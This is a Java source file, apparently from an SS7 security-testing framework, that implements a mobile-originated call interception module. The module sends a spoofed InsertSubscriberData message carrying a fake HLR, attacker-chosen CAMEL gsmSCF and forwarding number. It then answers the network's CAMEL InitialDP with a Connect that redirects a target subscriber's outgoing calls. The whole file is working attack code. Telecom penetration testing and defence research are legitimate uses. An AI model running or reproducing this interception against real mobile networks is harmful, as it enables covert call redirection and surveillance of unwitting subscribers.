/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.interception;

import com.rodan.intruder.ss7.entities.event.model.camel.IdpRequest;
import com.rodan.intruder.ss7.entities.event.model.mobility.IsdResponse;
import com.rodan.intruder.ss7.entities.event.service.CapCsCallListener;
import com.rodan.intruder.ss7.entities.event.service.MapMobilityServiceListener;
import com.rodan.intruder.ss7.entities.payload.camel.CamelConnectPayload;
import com.rodan.intruder.ss7.entities.payload.mobility.IsdPayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.Ss7WithCapModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.interception.MoCallInterceptionOptions;
import com.rodan.intruder.ss7.usecases.model.interception.MoCallInterceptionResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.library.model.notification.NotificationType;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.MO_CALL_INTERCEPTION_NAME, category = Ss7ModuleConstants.INTERCEPTION_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.MO_CALL_INTERCEPTION_DISPLAY_NAME, brief = Ss7ModuleConstants.MO_CALL_INTERCEPTION_BRIEF,
        description = Ss7ModuleConstants.MO_CALL_INTERCEPTION_DESCRIPTION, rank = Ss7ModuleConstants.MO_CALL_INTERCEPTION_RANK,
        mainPayload = Constants.ISD_PAYLOAD_NAME)
public class MoCallInterceptionModule extends Ss7WithCapModuleTemplate implements SignalingModule,
        MapMobilityServiceListener, CapCsCallListener {
    final static Logger logger = LogManager.getLogger(MoCallInterceptionModule.class);

    @Builder
    public MoCallInterceptionModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
        setTaskWaitTime(Ss7ModuleTemplate.MAX_TASK_WAIT_TIME);
    }

    //    @Override
//    protected void validateOptions() throws ValidationException {
//        this.moduleOptions.validate();
//        // TODO IMP validate if MAP version is comptable with all loaded payloads, do it for all modules
//    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (MoCallInterceptionOptions) moduleOptions;
        var payload = IsdPayload.builder()
                .usage(IsdPayload.Usage.REDIRECT_CAMEL)
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .imsi(options.getImsi())
                .forwardMsisdn(options.getForwardMsisdn())
                .gsmScf(options.getGsmScf())
                .targetVlrGt(options.getTargetVlrGt())
                .targetHlrGt(options.getTargetHlrGt())
                .spoofHlr(options.getSpoofHlr())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addMobilityServiceListener(localSsn, this);
        getGateway().addCapCsCallListener(Constants.SCCP_CAP_SSN, this); // TODO SS7: Don't hardcode CAP SSN
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeMobilityServiceListener(localSsn, this);
            getGateway().removeCapCsCallListener(Constants.SCCP_CAP_SSN, this); // TODO SS7: Don't hardcode CAP SSN
        }
    }

    @Override
    public void onInsertSubscriberDataResponse(IsdResponse response) {
        try {
            logger.debug("##### Received ISD response!");
            logger.debug(response);

            logger.debug("##### Sending TCAP-END for ISD response!");
            var dialog = response.getDialog();
            var invokeId = response.getInvokeId();
            dialog.setUserObject(invokeId);
            // Close dialog since it's not closed by remote nod in ISD response
            getGateway().close(dialog);
            notify("Waiting for CAMEL InitialDP...", NotificationType.PROGRESS);

        } catch (SystemException e) {
            String msg = "Failed to parse TCAP-END for ISD response";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);
            setExecutionError(true);
        }
    }

    @Override
    public void onInitialDPRequest(IdpRequest request) {
        try {
            logger.debug("##### Received initialDP request!");
            logger.debug(request);

            var dialog = request.getDialog();
            var invokeId = request.getInvokeId();
            dialog.setUserObject(invokeId);

            var calledNumber = request.getCalledNumber();
            var msg = "Call to " + calledNumber + " was redirected to " +
            ((MoCallInterceptionOptions) moduleOptions).getForwardMsisdn() + " successfully";
            notify(msg, NotificationType.PROGRESS);

            var localGt = ((MoCallInterceptionOptions) moduleOptions).getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle();
            var capPayload = CamelConnectPayload.builder()
                    .msisdn(((MoCallInterceptionOptions) moduleOptions).getForwardMsisdn())
                    .targetMscGt(request.getRemoteAddress()).localGt(localGt)
                    .build();
            logger.debug("##### capOptions: [" + capPayload + "]");

            getGateway().addToDialog(capPayload, dialog);
            getGateway().send(dialog);

            setResultReceived(true);
            moduleResponse = MoCallInterceptionResponse.builder().result("Call redirected successfully").build();
            logger.debug("Call interception completed!");

        } catch (SystemException e) {
            String msg = "Failed to handle IDP request";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);
            setExecutionError(true);
        }
    }
}
